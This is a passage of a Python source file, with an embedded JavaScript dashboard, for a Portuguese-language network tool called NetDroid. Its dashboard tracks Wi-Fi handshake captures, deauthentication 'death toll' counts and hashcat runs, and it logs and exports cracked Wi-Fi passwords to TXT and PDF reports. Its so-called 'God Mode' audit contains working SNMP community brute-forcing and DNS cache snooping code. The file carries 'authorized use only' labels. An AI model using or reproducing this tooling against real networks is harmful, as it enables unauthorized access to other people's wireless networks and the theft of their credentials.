    `).join("");
  }
}
function clearWordlistSelection(){
  selectedWordlists = [];
  wordlistQueueOrder = [];
  renderWordlistQueue();
  document.querySelectorAll('.wordlist-checkbox input').forEach(cb => cb.checked = false);
}

function log(msg, tipo){
  const el = document.getElementById("logfeed");
  const cor = {info:"text-cyan-400",ok:"text-green-400",warn:"text-yellow-400",err:"text-red-400"}[tipo]||"text-gray-400";
  const t = new Date().toLocaleTimeString();
  let novo = `<span class="${cor}">[${t}] ${msg}</span>\n` + el.innerHTML;
  // B8: cap em 50KB (~300 linhas) para evitar memory leak em sessões longas
  if(novo.length > 50000) novo = novo.slice(0, 50000);
  el.innerHTML = novo;
}

setInterval(()=>{document.getElementById("timestamp").textContent = new Date().toLocaleTimeString();},1000);
setInterval(carregarWordlists, 10000);

let lastTotal=0, lastT=Date.now();
// B6: garante que ap.crack reflete senha vinda da memória (sessões anteriores)
function _hidrarCrackDeMemoria(ap){
  if(!ap) return ap;
  if(ap.senha && (!ap.crack || !ap.crack.senha)){
    ap.crack = ap.crack || {};
    ap.crack.status = "cracked";
    ap.crack.senha = ap.senha;
    ap.crack.progresso = 100;
    ap.crack.wordlist_quebrou = ap.wordlist_usada || "";
    ap.crack.eta = "—";
  }
  return ap;
}

sock.on("estado_inicial",s=>{
  (s.aps||[]).forEach(a=>{ aps[a.bssid]=_hidrarCrackDeMemoria(a); });
  if(s.zonas){zonas={...zonas,...s.zonas}}
  document.getElementById("stat-pkts").textContent = (s.pacotes_total||0).toLocaleString();
  renderZonas(); bindSortable(); carregarWordlists(); atualizarStatsMemoria();
});
sock.on("rescan_done",d=>{
  log(`✓ Remap: ${d.novos} novas | ${d.atualizados||0} atualizadas | total ${d.total}`,"ok");
  atualizarStatsMemoria();
});
sock.on("ap_descoberto",a=>{
  aps[a.bssid]=_hidrarCrackDeMemoria(a);
  if(!Object.values(zonas).flat().includes(a.bssid)) zonas.verde.push(a.bssid);
  renderZonas();
  log(`AP descoberto: ${a.essid||"?"} (${a.bssid}) ${a.crypto||""}`,"ok");
});
sock.on("ap_update",a=>{Object.assign(aps[a.bssid]||(aps[a.bssid]={}),a);renderZonas();});
sock.on("handshake_log",d=>{ log(`🎯 ${d.bssid}: ${d.msg}`,"info"); });
sock.on("carrossel_status",d=>{
  carrosselState.ativo = !!d.ativo;
  if(!d.ativo){
    carrosselState.canal = null; carrosselState.restante_s = 0;
    carrosselState.canais_pendentes = [];
  }
  renderZonas();
  log(`🔄 Carrossel ${d.ativo?"iniciado":"parado"}`, d.ativo?"ok":"warn");
});
sock.on("carrossel_slot",d=>{
  log(`🔄 Slot ch${d.canal} · ${d.vermelha} vermelha + ${d.azul} azul · ${d.slot_s}s`,"info");
});
sock.on("carrossel_config",d=>{
  const lbl = d.infinito ? `🔒 ∞ ch${d.canal_lockado||"?"}` :
              (d.slot_vermelha >= 3600 ? `${d.slot_vermelha/3600}h` :
               d.slot_vermelha >= 60 ? `${d.slot_vermelha/60}min` :
               `${d.slot_vermelha}s`);
  log(`⚙ Config carrossel: vermelha=${lbl}`, "info");
});
sock.on("carrossel_tick",d=>{
  carrosselState.ativo = !!d.ativo;
  carrosselState.canal = d.canal;
  carrosselState.restante_s = d.restante_s;
  carrosselState.slot_s = d.slot_s;
  renderZonas();
});
sock.on("handshake_tentativa",d=>{
  if(aps[d.bssid]){
    aps[d.bssid].crack = aps[d.bssid].crack || {};
    aps[d.bssid].crack.tentativa = d.tentativa;
    aps[d.bssid].crack.estrategia = d.estrategia;
    renderZonas();
  }
});
sock.on("handshake_capturado",d=>{
  log(`✅ Handshake REAL capturado: ${d.bssid} → ${d.pcap}`,"ok");
  toast(`✅ Handshake capturado para ${aps[d.bssid]?.essid||d.bssid}`);
});
sock.on("pacotes_total",p=>{
  const total = p.total||0;
  const dt = (Date.now()-lastT)/1000;
  const pps = dt>0?Math.round((total-lastTotal)/dt):0;
  lastTotal = total; lastT = Date.now();
  document.getElementById("stat-pkts").textContent = total.toLocaleString();
  document.getElementById("stat-pps").textContent = pps.toLocaleString();
});
sock.on("hashcat_start",d=>{aps[d.item.bssid]=aps[d.item.bssid]||{};aps[d.item.bssid].crack=d.item;renderZonas();log(`▶ Crack iniciado em ${d.item.bssid} (${d.item.contextual_count||0} variações contextuais)`,"info");});
sock.on("hashcat_progress",d=>{if(aps[d.item.bssid]){aps[d.item.bssid].crack=d.item;renderZonas();}});
sock.on("hashcat_done",d=>{
  if(aps[d.item.bssid]){aps[d.item.bssid].crack=d.item;}
  if(d.item.status==="cracked") {
    // F4: dispara animação morph-to-green + glow-victory por 4s
    zonasRecemCracked.add(d.item.bssid);
    // Atualiza ap.senha para sobreviver entre re-renderizações
    if(aps[d.item.bssid]) {
      aps[d.item.bssid].senha = d.item.senha;
      aps[d.item.bssid].wordlist_usada = d.item.wordlist_quebrou || d.item.wordlist_efetiva || "";
      aps[d.item.bssid].quebrada_em = d.item.finished_at || new Date().toISOString();
    }
    renderZonas();
    setTimeout(()=>{
      zonasRecemCracked.delete(d.item.bssid);
      renderZonas();
    }, 4200);
    log(`🔓 SENHA QUEBRADA ${d.item.bssid}: ${d.item.senha}`,"ok");
    atualizarStatsMemoria();
  } else {
    renderZonas();
    log(`❌ Crack falhou ${d.item.bssid}: ${d.item.erro||d.item.status}`,"err");
  }
});
// B9: listeners órfãos removidos (host_found, host_update, vuln_found, fase
// não são emitidos pelo backend KAMIKASE — eram resíduo do template GOD)
sock.on("monitor_failed",d=>{
  if(aps[d.bssid]){aps[d.bssid].monitor_failed=true; aps[d.bssid].monitor_aviso=d.motivo;}
  log(`⚠ Monitor mode ausente para ${d.bssid}: ${d.motivo||""}`,"warn");
  renderZonas();
});
sock.on("log",d=>log(d.msg,d.tipo||"info"));
</script>
</body></html>"""


# ══════════════════ ZONA EXPORTER (--live --kamikase) ══════════
# Gera arquivos TXT + PDF em ./imports/ com snapshot de uma zona
# (verde, vermelha, azul ou todas) do dashboard.

class ZonaExporter:
    """Exporta lista de APs de uma zona para TXT + PDF.
    TXT: legível em qualquer editor. PDF: relatório formal cyberpunk."""

    def __init__(self, ui: "TerminalUI"):
        self.ui = ui

    def exportar(self, zona_label: str, aps: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Gera os 2 arquivos. Retorna {ok, paths, count}.
        zona_label: 'verde'|'vermelha'|'azul'|'todas'."""
        IMPORTS_DIR.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        base = IMPORTS_DIR / f"zona_{zona_label}_{ts}"
        path_txt = base.with_suffix(".txt")
        path_pdf = base.with_suffix(".pdf")
        gerados: List[str] = []

        # TXT sempre é gerado (é leve e não depende de lib externa)
        try:
            self._gerar_txt(zona_label, aps, path_txt)
            gerados.append(str(path_txt))
        except Exception as e:
            self.ui.error(f"Falha ao gerar TXT: {e}")

        # PDF só se reportlab disponível
        if HAS_REPORTLAB:
            try:
                self._gerar_pdf(zona_label, aps, path_pdf)
                gerados.append(str(path_pdf))
            except Exception as e:
                self.ui.error(f"Falha ao gerar PDF: {e}")
        else:
            self.ui.warn("reportlab não disponível — PDF não gerado.")

        return {"ok": bool(gerados), "paths": gerados, "count": len(aps),
                "zona": zona_label}

    def _gerar_txt(self, zona_label: str, aps: List[Dict[str, Any]], path: Path):
        linhas: List[str] = []
        sep = "=" * 72
        linhas.append(sep)
        linhas.append(f"  NetDroid v{VERSION} — Export Zona {zona_label.upper()}")
        linhas.append(f"  Gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
        linhas.append(f"  Total de APs: {len(aps)}")
        linhas.append(sep)
        linhas.append("")

        for i, ap in enumerate(aps, 1):
            linhas.append(f"[{i:03d}] {ap.get('essid', '?')}")
            linhas.append(f"     BSSID:        {ap.get('bssid', '?')}")
            linhas.append(f"     Canal:        {ap.get('canal', '?')} ({ap.get('band_label', '?')})")
            linhas.append(f"     Frequência:   {ap.get('freq_mhz', '?')} MHz")
            linhas.append(f"     Sinal:        {ap.get('rssi_dbm', '?')} dBm "
                          f"({ap.get('signal_label', '?')})")
            linhas.append(f"     Segurança:    {ap.get('security', ap.get('crypto', '?'))}")
            linhas.append(f"     WPS:          {'ATIVO ⚠' if ap.get('wps_enabled') else 'desativado'}")
            linhas.append(f"     Score:        {ap.get('score', '?')}/100  ({ap.get('severidade_maior', 'ok')})")
            linhas.append(f"     Fonte scan:   {ap.get('source', '?')}")

            if ap.get("achados"):
                linhas.append(f"     Achados ({len(ap['achados'])}):")
                for a in ap["achados"]:
                    linhas.append(f"       - [{a.get('severidade', '?').upper()}] {a.get('descricao', '?')}")

            if ap.get("primeiro_visto"):
                linhas.append(f"     Primeiro visto: {ap['primeiro_visto']}")
            if ap.get("ultima_vez"):
                linhas.append(f"     Última vez:     {ap['ultima_vez']}")
            if ap.get("visitas"):
                linhas.append(f"     Visitas:        {ap['visitas']}")
            if ap.get("pacotes"):
                linhas.append(f"     Deauth pkts:    {ap['pacotes']}")
            if ap.get("handshake_path"):
                linhas.append(f"     Handshake:      {ap['handshake_path']}")
            if ap.get("senha"):
                linhas.append(f"     🔓 SENHA:       {ap['senha']}")
                if ap.get("wordlist_usada"):
                    linhas.append(f"        via wordlist: {ap['wordlist_usada']}")
                if ap.get("quebrada_em"):
                    linhas.append(f"        quebrada em:  {ap['quebrada_em']}")

            crack = ap.get("crack") or {}
            if crack.get("status") and crack["status"] not in ("queued",):
                linhas.append(f"     Crack:        {crack.get('status', '?')} "
                              f"({crack.get('progresso', 0)}%)")
                if crack.get("eta"):
                    linhas.append(f"        ETA:          {crack['eta']}")

            linhas.append("")  # separa APs

        linhas.append(sep)
        linhas.append(f"  Fim do export · NetDroid v{VERSION} · uso autorizado apenas")
        linhas.append(sep)

        path.write_text("\n".join(linhas), encoding="utf-8")
        self.ui.success(f"TXT exportado: {path}")

    def _gerar_pdf(self, zona_label: str, aps: List[Dict[str, Any]], path: Path):
        zona_cores = {
            "verde":    rl_colors.HexColor("#00ff9f"),
            "vermelha": rl_colors.HexColor("#ff003c"),
            "azul":     rl_colors.HexColor("#00d4ff"),
            "todas":    rl_colors.HexColor("#bc13fe"),
        }
        cor_zona = zona_cores.get(zona_label, rl_colors.HexColor("#cc0000"))

        doc = SimpleDocTemplate(str(path), pagesize=A4,
                                 leftMargin=1.5*cm, rightMargin=1.5*cm,
                                 topMargin=1.5*cm, bottomMargin=1.5*cm)
        styles = getSampleStyleSheet()
        h1 = ParagraphStyle("H1", parent=styles["Heading1"],
                             textColor=cor_zona, fontSize=20, spaceAfter=8,
                             fontName="Helvetica-Bold")
        h2 = ParagraphStyle("H2", parent=styles["Heading2"],
                             textColor=cor_zona, fontSize=12, spaceBefore=10,
                             spaceAfter=4, fontName="Helvetica-Bold")
        body = ParagraphStyle("Body", parent=styles["BodyText"],
                               fontSize=8.5, leading=11, fontName="Helvetica")
        meta = ParagraphStyle("Meta", parent=styles["BodyText"],
                               fontSize=7.5, leading=10, fontName="Helvetica",
                               textColor=rl_colors.HexColor("#555"))

        elementos: List[Any] = []
        elementos.append(Paragraph(f"NetDroid v{VERSION} — Zona {zona_label.upper()}", h1))
        elementos.append(Paragraph(
            f"Gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')} · "
            f"Total: <b>{len(aps)}</b> APs",
            meta))
        elementos.append(Spacer(1, 12))

        # Tabela resumo
        elementos.append(Paragraph("Resumo (todos os APs)", h2))
        tabela = [["#", "ESSID", "BSSID", "Canal", "RSSI", "Sec", "Score", "Senha"]]
        for i, ap in enumerate(aps, 1):
            tabela.append([
                str(i),
                str(ap.get("essid", "?"))[:20],
                str(ap.get("bssid", "?")),
                str(ap.get("canal", "?")),
                str(ap.get("rssi_dbm", "?")),
                str(ap.get("security", "?"))[:10],
                str(ap.get("score", "?")),
                "🔓 " + str(ap["senha"])[:18] if ap.get("senha") else "—",
            ])
        t = RLTable(tabela, repeatRows=1,
                     colWidths=[0.8*cm, 4*cm, 3.5*cm, 1.3*cm,
                                1.5*cm, 1.5*cm, 1.3*cm, 4*cm])
        t.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), rl_colors.HexColor("#1a0000")),
            ("TEXTCOLOR", (0, 0), (-1, 0), cor_zona),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
            ("FONTSIZE", (0, 0), (-1, -1), 7.5),
            ("BOTTOMPADDING", (0, 0), (-1, 0), 6),
            ("GRID", (0, 0), (-1, -1), 0.25, rl_colors.HexColor("#444")),
            ("ROWBACKGROUNDS", (0, 1), (-1, -1),
                [rl_colors.HexColor("#0a0a0a"), rl_colors.HexColor("#111")]),
            ("TEXTCOLOR", (0, 1), (-1, -1), rl_colors.HexColor("#e8eaed")),
        ]))
        elementos.append(t)

        # Detalhes por AP (página nova se >5)
        if len(aps) > 0:
            elementos.append(PageBreak())
            elementos.append(Paragraph("Detalhamento por AP", h1))
            for i, ap in enumerate(aps, 1):
                elementos.append(Paragraph(
                    f"<b>{i}. {ap.get('essid', '?')}</b>", h2))
                lines = [
                    f"<b>BSSID:</b> {ap.get('bssid', '?')}",
                    f"<b>Canal:</b> {ap.get('canal', '?')} ({ap.get('band_label', '?')}) · "
                    f"<b>Sinal:</b> {ap.get('rssi_dbm', '?')} dBm",
                    f"<b>Segurança:</b> {ap.get('security', '?')} · "
                    f"<b>WPS:</b> {'ATIVO' if ap.get('wps_enabled') else 'desativado'}",
                    f"<b>Score:</b> {ap.get('score', '?')}/100 · "
                    f"<b>Fonte:</b> {ap.get('source', '?')}",
                ]
                if ap.get("achados"):
                    achados_str = "; ".join(
                        f"[{a.get('severidade', '?').upper()}] {a.get('descricao', '?')}"
                        for a in ap["achados"]
                    )
                    lines.append(f"<b>Achados:</b> {achados_str}")
                if ap.get("senha"):
                    lines.append(
                        f"<b>🔓 SENHA:</b> <font color='#00aa44'>{ap['senha']}</font>")
                    if ap.get("wordlist_usada"):
                        lines.append(f"<b>Wordlist:</b> {ap['wordlist_usada']}")
                if ap.get("handshake_path"):
                    lines.append(f"<b>Handshake:</b> {ap['handshake_path']}")
                for ln in lines:
                    elementos.append(Paragraph(ln, body))
                elementos.append(Spacer(1, 6))

        elementos.append(Spacer(1, 16))
        elementos.append(Paragraph(
            f"NetDroid v{VERSION} — Localhost only — Uso autorizado apenas", meta))

        doc.build(elementos)
        self.ui.success(f"PDF exportado: {path}")


# ══════════════════ PDF REPORT ═════════════════════════════════
# Gera ./Familia_xxx/relatorio.pdf ao final do --god se reportlab disponível.

class PDFReport:
    """Relatório PDF executivo via reportlab."""

    def __init__(self, ui: "TerminalUI"):
        self.ui = ui

    def gerar(self, output_dir: Path, hosts: List[Dict], stress: Dict,
              god: Dict, kamikase: Dict, ctx_priv: Optional[Any]):
        if not HAS_REPORTLAB:
            self.ui.warn("reportlab não disponível — PDF não gerado.")
            return None
        path = output_dir / f"NetDroid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        try:
            doc = SimpleDocTemplate(str(path), pagesize=A4,
                                     leftMargin=2*cm, rightMargin=2*cm,
                                     topMargin=2*cm, bottomMargin=2*cm)
            styles = getSampleStyleSheet()
            estilo_h1 = ParagraphStyle("H1", parent=styles["Heading1"],
                                        textColor=rl_colors.HexColor("#cc0000"),
                                        fontSize=22, spaceAfter=10)
            estilo_h2 = ParagraphStyle("H2", parent=styles["Heading2"],
                                        textColor=rl_colors.HexColor("#cc0000"),
                                        fontSize=14, spaceBefore=12, spaceAfter=6)
            estilo_p = ParagraphStyle("P", parent=styles["BodyText"],
                                       fontSize=9, leading=12)
            elementos = []
            elementos.append(Paragraph(f"NetDroid v{VERSION} — Relatório Executivo", estilo_h1))
            elementos.append(Paragraph(
                f"Gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M')}", estilo_p))
            elementos.append(Spacer(1, 12))

            # Resumo
            total_vulns = sum(len(h.get("vulns", []) or []) for h in hosts)
            risks = god.get("risks", [])
            elementos.append(Paragraph("Resumo Geral", estilo_h2))
            elementos.append(Paragraph(
                f"<b>Hosts:</b> {len(hosts)} · <b>Vulnerabilidades:</b> {total_vulns} · "
                f"<b>Riscos:</b> {len(risks)} · <b>Modo Root:</b> "
                f"{'ativo (' + ctx_priv.motor + ')' if ctx_priv and ctx_priv.ativo else 'inativo'}",
                estilo_p))

            # Tabela de hosts
            elementos.append(Paragraph("Inventário de Hosts", estilo_h2))
            tabela_dados = [["IP", "Hostname", "Tipo", "Vendor", "Portas", "Risk"]]
            for h in hosts[:60]:
                tabela_dados.append([
                    h.get("ip", "?"),
                    (h.get("hostname", "") or "—")[:18],
                    h.get("device_type", "?")[:14],
                    (h.get("vendor", "?") or "?")[:12],
                    str(len(h.get("ports", []))),
                    str(next((r["score"] for r in risks if r["ip"] == h["ip"]), 0)),
                ])
            t = RLTable(tabela_dados, repeatRows=1)
            t.setStyle(TableStyle([
                ("BACKGROUND", (0, 0), (-1, 0), rl_colors.HexColor("#1a0000")),
                ("TEXTCOLOR", (0, 0), (-1, 0), rl_colors.HexColor("#cc0000")),
                ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
                ("FONTSIZE", (0, 0), (-1, -1), 8),
                ("BOTTOMPADDING", (0, 0), (-1, 0), 6),
                ("GRID", (0, 0), (-1, -1), 0.3, rl_colors.HexColor("#444")),
            ]))
            elementos.append(t)

            # Top vulnerabilidades
            if total_vulns:
                elementos.append(PageBreak())
                elementos.append(Paragraph("Top Vulnerabilidades", estilo_h2))
                vrows = [["IP", "Porta", "Severidade", "Dica/CVE"]]
                for h in hosts:
                    for v in (h.get("vulns", []) or [])[:3]:
                        vrows.append([
                            h["ip"], str(v.get("porta", "?")),
                            v.get("severidade", "info").upper(),
                            v.get("dica_cve", "")[:60],
                        ])
                vt = RLTable(vrows, repeatRows=1, colWidths=[3*cm, 1.5*cm, 2*cm, 9*cm])
                vt.setStyle(TableStyle([
                    ("BACKGROUND", (0, 0), (-1, 0), rl_colors.HexColor("#1a0000")),
                    ("TEXTCOLOR", (0, 0), (-1, 0), rl_colors.HexColor("#cc0000")),
                    ("FONTSIZE", (0, 0), (-1, -1), 7),
                    ("GRID", (0, 0), (-1, -1), 0.3, rl_colors.HexColor("#444")),
                ]))
                elementos.append(vt)

            # Kamikase
            if kamikase.get("ativo"):
                elementos.append(PageBreak())
                elementos.append(Paragraph("Kamikase — Death Toll", estilo_h2))
                elementos.append(Paragraph(
                    f"Total: <b>{kamikase.get('total_pacotes', 0):,}</b> pacotes · "
                    f"Duração: {kamikase.get('duracao_s', 0):.1f}s · "
                    f"BSSIDs atacados: {len(kamikase.get('alvos', []))}",
                    estilo_p))

            doc.build(elementos)
            self.ui.success(f"PDF: {path}")
            return path
        except Exception as e:
            self.ui.error(f"Falha ao gerar PDF: {e}")
            return None


# ═══════════════════ GOD MODE ═════════════════════════════════

class GodMode:
    """Deep defensive audit: inventory, exposure mapping and risk scoring."""

    def __init__(self, ui: TerminalUI, detector: NetworkDetector,
                 hosts: List[Dict[str, Any]]):
        self.ui = ui
        self.det = detector
        self.hosts = hosts
        self.found_creds: List[Dict] = []
        self.risk_findings: List[Dict] = []
        self.ssdp_devices: List[Dict] = []
        self.rtsp_streams: List[Dict] = []
        self.onvif_devices: List[Dict] = []

    async def run(self):
        self.ui.section("GOD MODE - DEEP DEFENSIVE AUDIT")
        emitir("fase", nome="AUDITORIA — fingerprints + amplificação + paths default", indice="3/3")
        # Sob --live ou --root, pula o consent (já dado pela escolha de modo)
        if not priv_ativo() and event_bus is None:
            if not self.ui.consent("Auditoria profunda da rede com coleta detalhada. Continuar?"):
                self.ui.warn("God Mode cancelado.")
                return

        # Sequencia de auditoria defensiva
        await self.run_onvif()
        await self._broadcast_sweep()
        await self._netbios_scan()
        await self._http_deep_probe()
        await self._rtsp_discovery()
        await self._sondar_servicos_amplificacao()
        await self._sondar_paths_default()
        self._sugerir_creds_padrao()
        # ─── Boost --root: técnicas privilegiadas ───
        if priv_ativo():
            await self._upgrade_root()
        self._assess_risks()
        self._print_god_summary()

    # ──────────── BOOST --root ─────────────────────────────────

    async def _upgrade_root(self):
        """Ativado quando --root presente. Adiciona em cada host:
        - SNMP wordlist expandida (40+ communities)
        - DNS cache snooping (queries não-recursivas em domínios populares)
        - LLDP/CDP sniff (scapy) — switches/routers vizinhos
        - ARP spoof passivo (tcpdump — gratuitous ARP suspeito)
        - Pcap seletivo via tcpdump (10s, busca creds)"""
        self.ui.section("ROOT BOOST — Auditoria Apex Privilegiada")
        loop = asyncio.get_event_loop()

        # 1) SNMP mass com wordlist expandida
        for host in self.hosts:
            if 161 not in host.get("ports", []):
                continue
            try:
                resultado = await loop.run_in_executor(None, self._snmp_mass, host["ip"])
                if resultado:
                    host["root_findings"] = host.get("root_findings", [])
                    host["root_findings"].append({
                        "tipo": "snmp_mass",
                        "evidencia": f"{len(resultado)} communities aceitas: "
                                    f"{', '.join(c for c, _ in resultado[:5])}",
                        "severidade": "alta",
                        "plataforma": ctx_priv.motor if ctx_priv else "?",
                    })
                    host["snmp_creds"] = host.get("snmp_creds", [])
                    for community, sysd in resultado:
                        host["snmp_creds"].append({"community": community, "sys_descr": sysd[:120]})
            except Exception:
                pass

        # 2) DNS cache snooping
        for host in self.hosts:
            if 53 not in host.get("ports", []):
                continue
            try:
                cacheados = await loop.run_in_executor(None, self._dns_cache_snoop, host["ip"])
                if cacheados:
                    host.setdefault("root_findings", []).append({
                        "tipo": "dns_cache_snoop",
                        "evidencia": f"Domínios cacheados: {', '.join(cacheados[:5])}",
                        "severidade": "media",
                        "plataforma": ctx_priv.motor if ctx_priv else "?",
                    })
            except Exception:
                pass

        # 3) LLDP/CDP sniff (scapy, 15s — só Linux/Kali com scapy)
        if tem_cap("scapy") and ctx_priv and ctx_priv.motor == "root-kali":
            try:
                lldp_info = await loop.run_in_executor(None, self._sniff_lldp_cdp, 15)
                if lldp_info:
                    # LLDP é por interface, não por host — guarda na 1ª host (gateway)
                    alvo = next((h for h in self.hosts if h.get("is_gateway")), self.hosts[0] if self.hosts else None)
                    if alvo:
                        alvo.setdefault("root_findings", []).append({
                            "tipo": "lldp_cdp",
                            "evidencia": "; ".join(lldp_info[:3]),
                            "severidade": "media",
                            "plataforma": "root-kali",
                        })
            except Exception:
                pass

        # 4) ARP spoof passivo via tcpdump (10s — Linux/Kali e Termux)
        if tem_cap("tcpdump") and ctx_priv and ctx_priv.motor in ("root-kali", "root-termux"):
            try:
                achados = await loop.run_in_executor(None, self._tcpdump_arp_spoof, 10)
                for ip_susp, evid in achados.items():
                    h = next((x for x in self.hosts if x["ip"] == ip_susp), None)
                    if h:
                        h.setdefault("root_findings", []).append({
                            "tipo": "arp_spoof_detected",
                            "evidencia": evid,
                            "severidade": "alta",
                            "plataforma": ctx_priv.motor,
                        })
            except Exception:
                pass
        self.ui.success("Root boost concluído.")

    def _snmp_mass(self, ip: str) -> List[Tuple[str, str]]:
        """Testa todas as comunidades em SNMP_COMMUNITIES_ROOT.
        Retorna lista [(community, sys_descr_ou_ok)]."""
        achados = []
        for community in SNMP_COMMUNITIES_ROOT:
            try:
                pacote = self._montar_pacote_snmp(community)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.8)
                s.sendto(pacote, (ip, 161))
                data, _ = s.recvfrom(2048)
                s.close()
                if not data or b"\xa2" not in data[:64]:
                    continue
                ascii_chunks = re.findall(rb"[\x20-\x7e]{6,}", data)
                rel = [c.decode("ascii", errors="ignore") for c in ascii_chunks
                       if c.decode("ascii", errors="ignore") != community]
                achados.append((community, rel[0] if rel else "ok"))
            except Exception:
                continue
        return achados

    def _dns_cache_snoop(self, ip: str) -> List[str]:
        """Query não-recursiva (RD=0) em domínios populares; resposta = cacheado."""
        cacheados = []
        dominios = ["google.com", "facebook.com", "youtube.com", "netflix.com",
                    "instagram.com", "whatsapp.com", "tiktok.com"]
        for dom in dominios:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.7)
                # Header DNS com RD=0 (não recursivo)
                tx = random.randint(0, 0xFFFF).to_bytes(2, "big")
                flags = b"\x00\x00"  # RD=0
                qdcount = b"\x00\x01"
                anc = nsc = arc = b"\x00\x00"
                qname = b""
                for parte in dom.split("."):
                    qname += bytes([len(parte)]) + parte.encode("ascii")
                qname += b"\x00"
                qtype = b"\x00\x01"  # A
                qclass = b"\x00\x01"
                pkt = tx + flags + qdcount + anc + nsc + arc + qname + qtype + qclass
                s.sendto(pkt, (ip, 53))
                data, _ = s.recvfrom(512)
                s.close()
                if len(data) > 12:
                    # Se ANCOUNT > 0, está cacheado (servidor respondeu sem recursão)
                    ancount = (data[6] << 8) | data[7]
                    if ancount > 0:
                        cacheados.append(dom)
            except Exception:
                continue
        return cacheados

    def _sniff_lldp_cdp(self, timeout_s: int) -> List[str]:
        """Sniff frames LLDP (01:80:c2:00:00:0e) e CDP (01:00:0c:cc:cc:cc)."""
        if not HAS_SCAPY:
            return []
        info: List[str] = []
        try:
            pkts = sniff(filter="ether host 01:80:c2:00:00:0e or ether host 01:00:0c:cc:cc:cc",
                         timeout=timeout_s, store=True)
            for p in pkts[:10]:
                # Heurística simples: extrai strings ASCII do payload
                raw = bytes(p)
                ascii_chunks = re.findall(rb"[\x20-\x7e]{4,}", raw)
                rel = [c.decode("ascii", errors="ignore") for c in ascii_chunks][:5]
                if rel:
                    info.append(" | ".join(rel))
        except Exception:
            return info
        return info

    def _tcpdump_arp_spoof(self, timeout_s: int) -> Dict[str, str]:
        """Roda `tcpdump -i any arp -c 200 -n` por timeout_s e detecta
        IPs com mais de um MAC (gratuitous ARP suspeito)."""
        ip_para_macs: Dict[str, Set[str]] = defaultdict(set)
        try:
            cmd = ["tcpdump", "-i", "any", "arp", "-n", "-l", "-c", "200"]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            t0 = time.time()
            while time.time() - t0 < timeout_s and proc.poll() is None:
                line = proc.stdout.readline().decode("ascii", errors="ignore")
                # Padrão: "is-at MAC" e "tell IP"
                m = re.search(r"(\d+\.\d+\.\d+\.\d+).*?is-at\s+([0-9a-f:]+)", line, re.I)
                if m:
                    ip_para_macs[m.group(1)].add(m.group(2).upper())
            try:
                proc.terminate()
            except Exception:
                pass
        except Exception:
            return {}
        suspeitos = {}
        for ip, macs in ip_para_macs.items():
            if len(macs) > 1:
                suspeitos[ip] = f"IP com {len(macs)} MACs distintos: {', '.join(macs)}"
        return suspeitos

    async def _broadcast_sweep(self):
        self.ui.info("UDP Broadcast sweep...")
        subnet = self.det.subnet
        if not subnet:
            return
        broadcast = str(ipaddress.ip_network(subnet, strict=False).broadcast_address)
        payload = os.urandom(64)
        ports = [9, 7, 1900, 5353, 137]

        def send_broadcasts():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(0.5)
            for port in ports:
                try:
                    sock.sendto(payload, (broadcast, port))
                except Exception:
                    pass
            sock.close()

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, send_broadcasts)
        await self._ssdp_discover()
        self.ui.success(f"Broadcast: {len(self.ssdp_devices)} dispositivos SSDP")

    async def _ssdp_discover(self):
        msg = (
            "M-SEARCH * HTTP/1.1\r\n"
            "HOST: 239.255.255.250:1900\r\n"
            'MAN: "ssdp:discover"\r\n'
            "MX: 3\r\n"
            "ST: ssdp:all\r\n\r\n"
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(3)
            sock.sendto(msg.encode(), ("239.255.255.250", 1900))
            while True:
                try:
                    data, addr = sock.recvfrom(4096)
                    resp = data.decode(errors="ignore")
                    device = {"ip": addr[0], "port": addr[1]}
                    for line in resp.splitlines():
                        if ":" in line:
                            k, v = line.split(":", 1)
                            device[k.strip().lower()] = v.strip()
                    self.ssdp_devices.append(device)
                except socket.timeout:
                    break
            sock.close()
        except Exception:
            pass

    async def _netbios_scan(self):
        self.ui.info("NetBIOS scan...")
        query = (b"\x80\x94\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                 b"\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01")
        found_hosts = []

        def query_host(ip: str):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(query, (ip, 137))
                data, _ = sock.recvfrom(1024)
                sock.close()
                if len(data) > 56:
                    name_count = data[56]
                    names = []
                    offset = 57
                    for _ in range(min(name_count, 10)):
                        if offset + 18 <= len(data):
                            name = data[offset:offset + 15].decode(errors="ignore").strip()
                            if name:
                                names.append(name)
                            offset += 18
                    if names:
                        found_hosts.append({"ip": ip, "names": names})
                        return True
            except Exception:
                pass
            return False

        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor(max_workers=50) as pool:
            targets = [h["ip"] for h in self.hosts]
            results = await asyncio.gather(*[
                loop.run_in_executor(pool, query_host, ip) for ip in targets])

        if found_hosts:
            self.ui.success(f"NetBIOS: {len(found_hosts)} hosts Windows encontrados")
            for h in found_hosts:
                self.ui.info(f"  {h['ip']}: {', '.join(h['names'][:3])}")
            self.ui.info("NetBIOS em modo inventario: nenhuma mensagem ativa enviada.")

    def _send_netbios_message(self, hosts: List[Dict]):
        self.ui.warn("Envio de mensagem NetBIOS desativado por seguranca.")

    async def _http_deep_probe(self):
        if not HAS_AIOHTTP or not HAS_BS4:
            self.ui.warn("aiohttp/bs4 necessários para HTTP deep probe")
            return
        self.ui.info("HTTP Deep Probe em hosts com portas web...")
        web_hosts = []
        for h in self.hosts:
